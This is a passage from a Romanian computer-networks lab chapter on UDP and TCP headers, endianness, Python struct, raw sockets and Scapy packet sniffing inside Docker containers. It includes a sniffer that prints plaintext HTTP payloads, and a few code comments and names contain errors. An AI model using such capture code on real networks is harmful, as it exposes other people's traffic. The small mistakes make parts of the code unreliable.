# Capitolul 3 

## Cuprins
- [Introducere](#intro)
  - [Network Stacks](#stacks)
  - [Big Endian (Network Order) vs. Little Endian](#endianness)
  - [Python Bytes as C Types](#ctypes)
- [UDP Datagram](#udp)
  - [Exemplu de calcul pentru checksum](#checksum)
  - [UDP Socket](#udp_socket)
  - [UDP Raw Socket](#udp_raw_socket)
  - [UDP Scapy](#udp_scapy)
- [Funcțiile sniff și send(p), sr(p), sr(p)1 în scapy](#scapy_sniff)
- [TCP Segment](#tcp)
  - [TCP Options](#tcp_options)
  - [TCP Retransmissions](#tcp_retransmission)
  - [TCP Socket](#tcp_socket)
  - [TCP Raw Socket](#tcp_raw_socket)
  - [TCP Scapy](#tcp_scapy)
  - [TCP Options in Scapy](#tcp_options_scapy)
- [IPv4 Datagram](#ipv4)
  - [IPv4 Raw Socket](#ip_raw_socket)
  - [IPv4 Scapy](#ip_scapy)
- [IPv6 Datagram](#ipv6)
  - [IPv6 Socket](#ipv6_socket)
  - [IPv6 Scapy](#ipv6_scapy)
- [Ethernet Frame](#ether)
  - [Ethernet Object in Scapy](#ether_scapy)
- [Address Resolution Protocol](#arp)
  - [ARP in Scapy](#arp_scapy)
- [Intercept Packages](#scapy_nfqueue)
    - [Block Intercepted Packages](#scapy_nfqueue_block)
- [Exemple de protocoale în Scapy](#scapy)
  - [Internet Control Message Protocol (ICMP)](#scapy_icmp)
  - [Domain Name System (DNS)](#scapy_dns)
    - [DNS Request](#scapy_dns_request)
    - [Micro DNS Server](#scapy_dns_server)
    - [DNS Spoofing](#scapy_dns_spoofing)
- [Exerciții](#exercitii)

<a name="intro"></a> 
## Introducere
```
cd computer-networks

# ștergem toate containerele create default
./docker-compose down

# ștergem rețelele create anterior ca să nu se suprapună cu noile subnets
docker network prune

# lucrăm cu docker-compose.yml din capitolul3
cd capitolul3
docker-compose up -d

# sau din directorul computer-networks: 
# ./docker-compose -f capitolul3/docker-compose.yml up -d
```

Fișierul `docker-compose.yml` definește 4 containere `server, router, client, middle` având ip-uri fixe în subneturi diferite, iar `router` este un container care funcționează ca router între cele două subrețele. Observați în [command pentru server](https://github.com/senisioi/computer-networks/blob/2020/capitolul3/src/server.sh): `ip route add 172.10.0.0/16 via 198.10.0.1` adăugarea unei rute către subnetul în care se află clientul via ip-ul containerului router. De asemenea, în containerul client există o rută către server prin containerul router: `ip route add 198.10.0.0/16 via 172.10.0.1`.

Serviciile router și middle sunt setate să facă forwarding `net.ipv4.ip_forward=1`, lucru care se poate observa prin valoarea=1 setată: `bash /proc/sys/net/ipv4/ip_forward`. 

Toate containerele execută o comandă de firewall prin iptables: `iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP` pentru a dezactiva regula automată de reset a conexiunilor TCP care nu sunt initiate de sistemului de operare.

Mai jos este diagrama pentru topologia containerelor:
```
            MIDDLE <-------\
        subnet2: 198.10.0.3 \
           forwarding        \
                              \
                               \
                                \
    SERVER     <------------> ROUTER <------------> CLIENT
subnet2: 198.10.0.2      subnet1: 172.10.0.1      subnet1: 172.10.0.2
                         subnet2: 198.10.0.1    
                         subnet1 <-> subnet2
                             forwarding
```


<a name="stacks"></a> 
### Network Stacks
Stiva OSI:
![OSI7](https://www.cloudflare.com/img/learning/ddos/what-is-a-ddos-attack/osi-model-7-layers.svg)

Stiva TCP IP:
![alt text](https://raw.githubusercontent.com/senisioi/computer-networks/2020/capitolul3/layers.jpg)


<a name="endianness"></a>
### [Big Endian (Network Order) vs. Little Endian](https://en.m.wikipedia.org/wiki/Endianness#Etymology)

Numarul 16 se scrie in binar: `10000 (2^4)`, deci numărăm biții de la dreapta la stânga. 
Dacă numărul ar fi stocat într-un tip de date pe 8 biți, s-ar scrie: `00010000`
Dacă ar fi reprezentat pe 16 biți, s-ar scrie: `00000000 00010000`, completând cu 0 pe pozițiile mai mari până obținem 16 biți.

În calculatoare există două tipuri de reprezentare a ordinii octeților: 
- **Big Endian** este: 00000000 00010000
  - cel mai semnificativ bit are adresa cea mai mică, octet 0: 00010000, octet 1: 00000000
- **Little Endian** este: 00010000 00000000
  - cel mai semnificativ bit are adresa cea mai mare, octet 0: 00000000, octet 1: 00010000

Pe rețea mesajele transmise trebuie să fie reprezentate într-un mod standardizat, independent de reprezentarea octeților pe mașinile de pe care sunt trimise, și acest standard este dat de Big Endian sau **Network Order**.

Pentru a verifica ce endianness are calculatorul vostru puteti rula din python:
```python
import sys
print(sys.byteorder)
```


<a name="ctypes"></a> 
### Python Bytes as C Types
În python există [modulul struct](https://docs.python.org/3.0/library/struct.html) care face conversia din tipul de date standard al limbajului în bytes reprezentând tipuri de date din C. Acest lucru este util fiindcă în cadrul rețelelor vom avea de configurat elemente low-level ale protocoalelor care sunt restricționate pe lungimi fixe de biți. Ca exemplu, headerul UDP este structurat din 4 cuvinte de 16 biți (port sursă, port destinație, lungime și checksum):
```python
import struct

# functia pack ia valorile date ca parametru si le "impacheteaza" dupa un tip de date din C dat
struct.pack(formatare, val1, val2, val3)

# functia unpack face exact opusul, despacheteaza un sir de bytes in variabile dupa un format 
struct.unpack(formatare, sir_de_bytes)
```

#### Tipuri de formatare:

|Format Octeti|Tip de date C|Tip de date python|Nr. biți|Note|
|--- |--- |--- |--- |--- |
|`x`|pad byte|no value|8||
|`c`|char|bytes of length 1|8||
|`b`|signed char|integer|8|(1)|
|`B`|unsigned char|integer|8||
|`?`|_Bool|bool||(2)|
|`h`|short|integer|16||
|`H`|unsigned short|integer|16||
|`i`|int|integer|32||
|`I`|unsigned int|integer|32||
|`l`|long|integer|32||
|`L`|unsigned long|integer|32||
|`q`|long long|integer|64|(3)|
|`Q`|unsigned long long|integer|64|(3)|
|`f`|float|float|32||
|`d`|double|float|64||
|`s`|char[]|bytes||(1)|
|`p`|char[]|bytes||(1)|
|`P`|void *|integer|||

Note:
<ol class="arabic simple">
<li>The <tt class="docutils literal"><span class="pre">c</span></tt>, <tt class="docutils literal"><span class="pre">s</span></tt> and <tt class="docutils literal"><span class="pre">p</span></tt> conversion codes operate on <a title="bytes" class="reference external" href="functions.html#bytes"><tt class="xref docutils literal"><span class="pre">bytes</span></tt></a>
objects, but packing with such codes also supports <a title="str" class="reference external" href="functions.html#str"><tt class="xref docutils literal"><span class="pre">str</span></tt></a> objects,
which are encoded using UTF-8.</li>
<li>The <tt class="docutils literal"><span class="pre">'?'</span></tt> conversion code corresponds to the <tt class="xref docutils literal"><span class="pre">_Bool</span></tt> type defined by
C99. If this type is not available, it is simulated using a <tt class="xref docutils literal"><span class="pre">char</span></tt>. In
standard mode, it is always represented by one byte.</li>
<li>The <tt class="docutils literal"><span class="pre">'q'</span></tt> and <tt class="docutils literal"><span class="pre">'Q'</span></tt> conversion codes are available in native mode only if
the platform C compiler supports C <tt class="xref docutils literal"><span class="pre">long</span> <span class="pre">long</span></tt>, or, on Windows,
<tt class="xref docutils literal"><span class="pre">__int64</span></tt>.  They are always available in standard modes.</li>
</ol>

Metodele de pack/unpack sunt dependente de ordinea octeților din calculator. Pentru a seta un anumit tip de endianness cand folosim funcțiile din struct, putem pune înaintea formatării caracterele următoare:

|Caracter|Byte order|
|--- |--- |
|@|native|
|<|little-endian|
|>|big-endian|
|!|network (= big-endian)|


#### Exemple

```python
numar = 16
# impachetam numarul 16 intr-un 'unsigned short' pe 16 biti cu network order
octeti = struct.pack('!H', numar)
print("Network Order: ")
for byte in octeti:
    print (bin(byte))


# impachetam numarul 16 intr-un 'unsigned short' pe 16 biti cu Little Endian
octeti = struct.pack('<H', numar)
print("Little Endian: ")
for byte in octeti:
    print (bin(byte))

# B pentru 8 biti, numere unsigned intre 0-256
struct.pack('B', 300)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
struct.error: ubyte format requires 0 <= number <= 255

# string de 10 bytes, sunt codificati primii 10 si 
# restul sunt padded cu 0
struct.pack('10s', 'abcdef'.encode('utf-8'))
b'abcdef\x00\x00\x00\x00'


# numarul 256 packed in NetworkOrder pe 64 de biti
struct.pack('!L', 256)
b'\x00\x00\x01\x00'

# numarul 256 packed in LittleEndian pe 64 de biti
struct.pack('<L', 256)
b'\x00\x01\x00\x00'
```


<a name="udp"></a>
## [UDP Datagram Header](https://tools.ietf.org/html/rfc768)

Toate câmpurile din header-ul UDP sunt reprezentate pe câte 16 biți sau 2 octeți:
```
  0               1               2               3              4
  0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+- -----------------
 |          Source Port          |       Destination Port        |
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-   UDP header
 |          Length               |          Checksum             |
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+- -----------------
 |                       payload/data                            |     mesaj 
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+- -----------------
```
- Portul sursă și destinație în acest caz poate fi între 0 și 65535, nr maxim pe 16 biți. [Portul 0](https://www.lifewire.com/port-0-in-tcp-and-udp-818145) este rezervat iar o parte din porturi cu valori până la 1024 sunt [well-known](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers#Well-known_ports) și rezervate de către sistemul de operare. Pentru a putea aloca un astfel de port de către o aplicație client, este nevoie de drepturi de administrator.
- Length reprezintă lungimea în bytes a headerului și segmentului de date. Headerul este împărțit în 4 cîmpuri de 16 biți, deci are 8 octeți în total.
- Checksum - suma în complement față de 1 a bucăților de câte 16 biți, complementați cu 1, vezi mai multe detalii [aici](https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Checksum_computation) și [RFC1071 aici](https://tools.ietf.org/html/rfc1071) și [exemplu de calcul aici](https://www.youtube.com/watch?v=xWsD6a3KsAI). Este folosit pentru a verifica dacă un pachet trimis a fost alterat pe parcurs și dacă a ajuns integru la destinație.
Se calculează din concatenarea: unui pseudo-header de IP [adresa IP sursă, IP dest (32 biti fiecare), placeholder (8 biti setati pe 0), [protocol](https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers) (8 biti), și lungimea în bytes a întregii secțiuni TCP sau UDP (16 biti)], TCP sau UDP header cu checksum setat pe 0, și secțiunea de date. 
- Payload sau data reprezintă datele de la nivelul aplicației. Dacă scriem o aplicație care trimite un mesaj de la un client la un server, mesajul nostru va reprezenta partea de payload.


Mai jos este redată secțiunea pentru care calculăm checksum la UDP: IP pseudo-header + UDP header + Data.
```
  0               1               2               3              4
  0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+- -----------------
 |                       Source Address                          |
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                    Destination Address                        | IP pseudo-header
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |  placeholder  |    protocol   |        UDP/TCP length         |
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+- -----------------
 |          Source Port          |       Destination Port        |
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-   UDP header
 |          Length               |              0                |
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+- -----------------
 |                       payload/data                            |  Transport data
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+- -----------------
```

<a name="checksum"></a> 
#### Exemplu de calcul pentru checksum
În exemplul următor presupunem că limităm suma de control la maxim 3 biți și facem adunarea numerelor a și b în complement față de 1:
```python
max_biti = 3

# 7 e cel mai mare nr pe 3 biti
max_nr = (1 << max_biti) - 1
print (max_nr, ' ', bin(max_nr))
7   0b111

a = 5 # binar 101
b = 5 # binar 101
'''
suma in complement de 1:
  101+
  101
-------
1|010
-------
  010+
  001
-------
 =011
valorile care depasesc 3 biti sunt mutate la coada si adunate din nou
'''
suma_in_complement_de_1 = (a + b) % max_nr
print (bin(suma_in_complement_de_1))
0b11

# checksum reprezinta suma in complement de 1 cu toti bitii complementati 
checksum = max_nr - suma_in_complement_de_1
print (bin(checksum))
0b100
# sau
checksum = ~(-suma_in_complement_de_1)
print (bin(checksum))
0b100
```

##### Exercițiu
Ce se întamplă dacă suma calculată este exact numărul maxim pe N biți?

<a name="#udp_socket"></a> 
### Socket UDP
În capitolul2 există exemple de [server](https://github.com/senisioi/computer-networks/blob/2020/capitolul2/src/udp_server.py) și [client](https://github.com/senisioi/computer-networks/blob/2020/capitolul2/src/udp_client.py) pentru protocolul UDP. Cele mai importante metode de socket udp sunt:
```python
# instantierea obiectului cu SOCK_DGRAM si IPPROTO_UDP
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, proto=socket.IPPROTO_UDP)

# recvfrom citeste din buffer un numar de bytest, ideal 65507
date, adresa = s.recvfrom(16)
# daca in buffer sunt mai mult de 16 bytes, recvfrom va citi doar 16 iar restul vor fi discarded

# functia sendto trimite bytes catre un tuplu (adresa, port)
s.sendto(b'bytes', ('adresa', port))
# nu stim daca mesajul ajunge la destinatie
``` 

<a name="udp_raw_socket"></a> 
### Raw Socket UDP
Există raw socket cu care putem citi sau trimite pachetele in formă binară. Explicații mai multe puteți găsi și [aici](https://opensourceforu.com/2015/03/a-guide-to-using-raw-sockets/). Pentru a instantia RAW Socket avem nevoie de acces cu drepturi de administrator. Deci este de preferat să lucrăm în containerele de docker: `docker-compose exec server bash`

```python
import socket

# instantierea obiectului cu SOCK_RAW si IPPROTO_UDP
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto=socket.IPPROTO_UDP)

# recvfrom citeste din buffer 65535 octeti indiferent de port
date, adresa = s.recvfrom(65535)


# presupunem ca un client trimite mesajul 'salut' de pe adresa routerului: sendto(b'salut', ('server', 2222)) 
# datele arata ca niste siruri de bytes cu payload salut
print(date)
b'E\x00\x00!\xc2\xd2@\x00@\x11\xeb\xe1\xc6\n\x00\x01\xc6\n\x00\x02\x08\xae\t\x1a\x00\r\x8c6salut'

# adresa sursa pare sa aiba portul 0
print (adresa)
('198.10.0.1', 0)

# datele au o lungime de 33 de bytes
# 20 de bytes header IP, 8 bytes header UDP, 5 bytes mesajul salut
print(len(data))
33

# extragem portul sursa, portul destinatie, lungimea si checksum din header:
(port_s, port_d, lungime, chksum) = struct.unpack('!HHHH', data[20:28])
(2222, 2330, 13, 35894)

nr_bytes_payload = lungime - 8 # sau len(data[28:])

payload = struct.unpack('!{}s'.format(nr_bytes_payload), data[28:])
(b'salut',)

payload = payload[0]
b'salut'
``` 


<a name="#udp_scapy"></a> 
### Scapy UDP
Într-un terminal dintr-un container rulați scapy: `docker-compose exec server scapy`

```python
udp_obj = UDP()
udp_obj.sport = 4444
udp_obj.dport = 2222
udp_obj.show()

###[ UDP ]### 
  sport= 4444
  dport= 2222
  len= None
  chksum= None

```

Pentru a scana pachetele care circulă, similar cu tcpdump, există funcția `sniff`:
```python
pachete = sniff()
# Trimiteti de pe router un mesaj UDP catre server: sendto(b'salut', ('server', 2222)) 
# Apasati Ctrl+C pentru a opri functia care monitorizeaza pachete

<Sniffed: TCP:0 UDP:1 ICMP:0 Other:0>

pachete[UDP][0].show()

###[ Ethernet ]### 
  dst= 02:42:c6:0a:00:02
  src= 02:42:c6:0a:00:01
  type= IPv4
###[ IP ]### 
     version= 4
     ihl= 5
     tos= 0x0
     len= 33
     id= 7207
     flags= DF
     frag= 0
     ttl= 64
     proto= udp
     chksum= 0x928d
     src= 198.10.0.1
     dst= 198.10.0.2
     \options\
###[ UDP ]### 
        sport= 2222
        dport= 2330
        len= 13
        chksum= 0x8c36
###[ Raw ]### 
           load= 'salut'
```

<a name="scapy_sniff"></a> 
## Funcțiile sniff și send(p), sr(p), sr(p)1 în scapy

Funcția `sniff()` ne permite să captăm pachete în cod cum am face cu wireshark sau tcpdump. De asemenea putem salva captura de pachete în format .pcap cu tcpdump: 
```bash
tcpdump -i any -s 65535 -w example.pcap
```
și putem încărca pachetele în scapy pentru a le procesa:
```python
packets = rdpcap('example.pcap')
for pachet in packets:
    if pachet.haslayer(ARP):
        pachet.show()
```

Mai mult, funcția sniff are un parametrul prin care putem trimite o metodă care să proceseze pachetul primit în funcție de conținut:
```python
def handler(pachet):
    if pachet.haslayer(TCP):
        if pachet[TCP].dport == 80: #or pachet[TCP].dport == 443:
            if pachet.haslayer(Raw):
                raw = pachet.getlayer(Raw)
                print(raw.load)
sniff(prn=handler)
```

Putem converti și octeții obținuți printr-un socket raw dacă știm care este primul layer (cel mai de jos):
```python
# vezi exemplul de mai sus cu UDP Raw Socket
raw_socket_date = b'E\x00\x00!\xc2\xd2@\x00@\x11\xeb\xe1\xc6\n\x00\x01\xc6\n\x00\x02\x08\xae\t\x1a\x00\r\x8c6salut'
# dacă am fi avut un raw_socket care citește și header ehternet, ar fi trebuit să folosim și 
pachet = IP(raw_socket_date)
pachet.show()
###[ IP ]### 
  version= 4
  ihl= 5
  tos= 0x0
  len= 33
  id= 49874
  flags= DF
  frag= 0
  ttl= 64
  proto= udp
  chksum= 0xebe1
  src= 198.10.0.1
  dst= 198.10.0.2
  \options\
###[ UDP ]### 
     sport= 2222
     dport= 2330
     len= 13
     chksum= 0x8c36
###[ Raw ]### 
        load= 'salut'
```


În scapy avem mai multe funcții de trimitere a pachetelor:
- `send()` - trimite un pachet pe rețea la nivelul network (layer 3), iar secțiunea de ethernet este completată de către sistem
- `answered, unanswered = sr()` - send_receive - trimite pachete pe rețea în loop și înregistrează și răspunsurile primite într-un tuplu (answered, unanswered), unde answered și unanswered reprezintă o listă de tupluri [(pachet_trimis1, răspuns_primit1), ...,(pachet_trimis100, răspuns_primit100)] 
- `answer = sr1()` - send_receive_1 - trimite pe rețea un pachet și înregistrează primul răspunsul

Pentru a trimite pachete la nivelul legatură de date (layer 2), completând manual câmpuri din secțiunea Ethernet, avem echivalentul funcțiilor de mai sus:
- `sendp()` - send_ethernet trimite un pachet la nivelul data-link, cu layer Ether custom
- `answered, unanswered = srp()` - send_receive_ethernet trimite pachete la layer 2 și înregistrează răspunsurile
- `answer = srp1()` - send_receive_1_ethernet la fel ca srp, dar înregistreazî doar primul răspuns



<a name="tcp"></a> 
## [TCP Segment](https://tools.ietf.org/html/rfc793#page-15)
```
  0               1               2               3              4 Offs.
  0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 0 1 2 3 4 5 6 7 
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |          Source Port          |       Destination Port        |  1
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                        Sequence Number                        |  2
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                    Acknowledgment Number                      |  3
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 | Data  |0 0 0| |C|E|U|A|P|R|S|F|                               |
 |Offset | Res.|N|W|C|R|C|S|S|Y|I|            Window             |  4
 |       |     |S|R|E|G|K|H|T|N|N|                               |
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |           Checksum            |         Urgent Pointer        |  5
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                    Options   (if data offset > 5)             | 
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
 |                    Application data                           | 
 -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
```

Prima specificație a protocolului TCP a fost în [RFC793](https://tools.ietf.org/html/rfc793)
- Foarte bine explicat [aici](http://zwerd.com/2017/11/24/TCP-connection.html), [aici](http://www.firewall.cx/networking-topics/protocols/tcp.html) sau în aceste [note de curs](https://engineering.purdue.edu/kak/compsec/NewLectures/Lecture16.pdf#page=25).
- [RFC2581](https://tools.ietf.org/html/rfc2581) conține informațiile cu privire la congestion control
- Source Port și Destination Port sunt porturile sursa și destinație pentru conexiunea curentă
- [Sequence și Acknowledgment](http://www.firewall.cx/networking-topics/protocols/tcp/134-tcp-seq-ack-numbers.html) sunt folosite pentru indicarea secvenței de bytes transmisă și notificarea că acea secvență a fost primită
- Data offset - dimensiunea header-ului în multipli de 32 de biți
- Res - 3 biți rezervați
- NS, CWR, ECE - biți pentru notificarea explicită a existenței congestionării [ECN](http://www.inacon.de/ph/data/TCP/Header_fields/TCP-Header-Field-ECN_OS_RFC-793_3540.htm), explicat mai bine și [aici](http://blog.catchpoint.com/2015/10/30/tcp-flags-cwr-ece/). NS e o sumă binară pentru sigurantă, CWR - indică necesitatea micsorării ferestrei de congestionare iar ECE este un bit de echo care indică prezența congestionarii.
- URG, ACK, PSH, RST, SYN, FIN - [flags](http://www.firewall.cx/networking-topics/protocols/tcp/136-tcp-flag-options.html)
- Window Size - folosit pentru [flow control](http://www.ccs-labs.org/teaching/rn/animations/flow/), exemplu [aici](http://www.inacon.de/ph/data/TCP/Header_fields/TCP-Header-Field-Window-Size_OS_RFC-793.htm)
- Urgent Pointer - mai multe detalii in [RFC6093](https://tools.ietf.org/html/rfc6093), pe scurt explicat [aici](http://www.firewall.cx/networking-topics/protocols/tcp/137-tcp-window-size-checksum.html).
- Checksum - suma în complement fată de 1 a bucăților de câte 16 biți, complementatî cu 1, vezi mai multe detalii [aici](https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Checksum_computation) și [RFC1071 aici](https://tools.ietf.org/html/rfc1071)
Se calculează din concatenarea: unui pseudo-header de IP [adresa IP sursă, IP dest (32 biti fiecare), placeholder (8 biti setati pe 0), [protocol](https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers) (8 biti), și lungimea în bytes a întregii secțiuni TCP sau UDP (16 biti)], TCP sau UDP header cu checksum setat pe 0, și secțiunea de date.

În plus, pe lângă proprietățile din antet, protocolul TCP are o serie de opțiuni (explicate mai jos) și o serie de euristici prin care se încearcă detectarea și evitarea congestionării rețeleleor. Explicațiile pe această temă pot fi urmărite în [capitolul din curs despre congesion control](https://github.com/senisioi/computer-networks/tree/2020/curs#congestion) sau în [notele de curs de aici](https://engineering.purdue.edu/kak/compsec/NewLectures/Lecture16.pdf#page=60). Toate se bazează pe specificațiile din [RFC 2581](https://tools.ietf.org/html/rfc2581) sau [RFC 6582](https://tools.ietf.org/html/rfc6582) din 2012.

<a name="tcp_options"></a> 
### Optiuni TCP
O [listă completă de opțiuni se găsește aici](http://www.networksorcery.com/enp/Protocol/tcp.htm#Options) si [aici](https://www.iana.org/assignments/tcp-parameters/tcp-parameters.xhtml). Optiunile au coduri, dimensiuni si specificatii particulare.
Probabil cele mai importante sunt prezentate pe scurt în [acest tutorial](http://www.firewall.cx/networking-topics/protocols/tcp/138-tcp-options.html): 
  - [Maximum Segment Size (MSS)](http://fivedots.coe.psu.ac.th/~kre/242-643/L08/html/mgp00005.html) definit [aici](https://tools.ietf.org/html/rfc793#page-18) seteaza dimensiunea maxima a segmentului pentru a se evita fragmetarea la nivelul Network.
  - [Window Scaling](https://cloudshark.io/articles/tcp-window-scaling-examples/) definit [aici](https://tools.ietf.org/html/rfc7323#page-8) - campul Window poate fi scalat cu valoarea Window * 2^WindowScaleOption
  - [Selective Acknowledgment](https://packetlife.net/blog/2010/jun/17/tcp-selective-acknowledgments-sack/) 
definit [aici](https://tools.ietf.org/html/rfc2018#page-3) permite trimiterea unor ack selective in functie de secventa pachetelor pierdute
  - [Timestamps](http://fivedots.coe.psu.ac.th/~kre/242-643/L08/html/mgp00011.html) (pentru round-trip-time) definite [aici](https://tools.ietf.org/html/rfc7323#page-12) inregistreaza timpul de primire a confirmarilor. In felul acesta se verifica daca reteaua este congestionata sau daca fluxul de trimitere trebuie redus.
  - [No-Operation](https://tools.ietf.org/html/rfc793#page-18) - no operation este folosit pentru separare între opțiuni sau pentru alinierea octetilor.
  - [End of Option List](https://tools.ietf.org/html/rfc793#page-18) - defineste capatul listei de optiuni
  - [Multipath TCP (MPTCP)](https://datatracker.ietf.org/doc/draft-ietf-mptcp-rfc6824bis/) - extensie a protocolului TCP care este inca abordata ca zona de cercetare pentru a permite mai multe path-uri de comunicare pentru o sesiune TCP. Explicat [aici](https://www.slashroot.in/what-tcp-multipath-and-how-does-multipath-tcp-work) sau in acest [film](https://www.youtube.com/watch?v=k-5pGlbiB3U).

<a name="tcp_retransmission"></a>
### Exercițiu TCP Retransmission
TCP este un protocol care oferă siguranța transmiterii pachetelor, în cazul în care un stream de octeți este trimis, se așteaptă o confirmare pentru acea secvență de bytes. Dacă confirmarea nu este primită se încearcă retransmiterea. Pentru a observa retransmisiile, putem introduce un delay artificial sau putem ignora anumite pachete pe rețea. Folosim un tool linux numit [netem](https://wiki.linuxfoundation.org/networking/netem) sau mai pe scurt [aici](https://stackoverflow.com/questions/614795/simulate-delayed-and-dropped-packets-on-linux).

În containerul router, în [docker-compose.yml](https://github.com/senisioi/computer-networks/blob/2020/capitolul3/docker-compose.yml) este commented comanda pentru [/drop_packages.sh](https://github.com/senisioi/computer-networks/blob/2020/capitolul3/src/drop_packages.sh). Fisierul respectiv este copiat în directorul root `/` in container prin comanda `COPY src/*.sh /` din Dockerfile-lab3. 
Prin scriptul comentat, routerul poate fi programat să renunțe la pachete cu o probabilitate de 50%: `tc qdisc add dev eth0 root netem loss 50% && tc qdisc add dev eth1 root netem loss 50%`. Puteți folosi această setare dacă doriți să verificați retransmiterea mesajelor în cazul TCP.

Porniți TCP Server și TCP Client în containerul server, respectiv client și executați schimburi de mesaje. Cu `tcpdump -Sntv -i any tcp` în containerul router puteți observa retransmiterile segmentelor.

<a name="#tcp_socket"></a> 
### Socket TCP
În capitolul2 există exemple de [server](https://github.com/senisioi/computer-networks/blob/2020/capitolul2/src/tcp_server.py) și [client](https://github.com/senisioi/computer-networks/blob/2020/capitolul2/src/tcp_client.py) pentru protocolul TCP. Cele mai importante metode sunt:
```python
# instantierea obiectului cu SOCK_STREAN si IPPROTO_TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAN, proto=socket.IPPROTO_TCP)

# asculta pentru 5 conexiuni simultane ne-acceptate
s.listen(5)
# accepta o conexiune, initializeaza 3-way handshake
s.accept()

# citeste 2 bytes din buffer, restul de octeti raman in buffer pentru citiri ulterioare
date = s.recv(2)

# trimite 6 bytes: 
s.send(b'octeti')
``` 

<a name="#tcp_raw_socket"></a> 
### Raw Socket TCP
Un exemplu de 3-way handshake facut cu Raw Socket este în directorul [capitolul3/src/examples/raw_socket_handshake.py](https://github.com/senisioi/computer-networks/blob/2020/capitolul3/src/examples/raw_socket_handshake.py)
Putem instantia un socket brut pentru a capta mesaje TCP de pe orice port:
```python

# instantierea obiectului cu SOCK_RAW si IPPROTO_TCP
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto=socket.IPPROTO_TCP)
data, adresa = s.recvfrom(65535)

# daca din router apelam catre server: sock.connect(('server', 2222)), acesta va primi:
(b'E\x00\x00<;\xb9@\x00@\x06r\xeb\xc6\n\x00\x01\xc6\n\x00\x02\xb1\x16\x08\xae;\xde\x84\xca\x00\x00\x00\x00\xa0\x02\xfa\xf0\x8cF\x00\x00\x02\x04\x05\xb4\x04\x02\x08\nSJ\xb6$\x00\x00\x00\x00\x01\x03\x03\x07', ('198.10.0.1', 0))

tcp_part = data[20:]
# ignoram headerul de IP de 20 de bytes si extrage header TCP fara optiuni
tcp_header_fara_optiuni = struct.unpack('!HHLLHHHH', tcp_part[:20])
source_port, dest_port, sequence_nr, ack_nr, doff_res_flags, window, checksum, urgent_ptr = tcp_header_fara_optiuni

print("Port sursa: ", source_port)
print("Port destinatie: ", dest_port)
print("Sequence number: ", sequence_nr)
print("Acknowledgment number: ", ack_nr)
data_offset = doff_res_flags >> 12
print("Data Offset: ", data_offset) # la cate randuri de 32 de biti sunt datele

offset_in_bytes = (doff_res_flags >> 12) * 4
if doff_res_flags >> 12 > 5:
  print("TCP header are optiuni, datele sunt abia peste  ", offset_in_bytes, " bytes")

NCEUAPRSF = doff_res_flags & 0b111111111 # & cu 9 de 1
print("NS: ", (NCEUAPRSF >> 8) & 1 )
print("CWR: ", (NCEUAPRSF >> 7) & 1 )
print("ECE: ", (NCEUAPRSF >> 6) & 1 )
print("URG: ", (NCEUAPRSF >> 5) & 1 )
print("ACK: ", (NCEUAPRSF >> 4) & 1 )
print("PSH: ", (NCEUAPRSF >> 3) & 1 )
print("RST: ", (NCEUAPRSF >> 2) & 1 )
print("SYN: ", (NCEUAPRSF >> 1) & 1 )
print("FIN: ", (NCEUAPRSF & 1))

print("Window: ", window)
print("Checksum: ", checksum)
print("Urgent Pointer: ", urgent_ptr)

optiuni_tcp = tcp_part[20:offset_in_bytes]

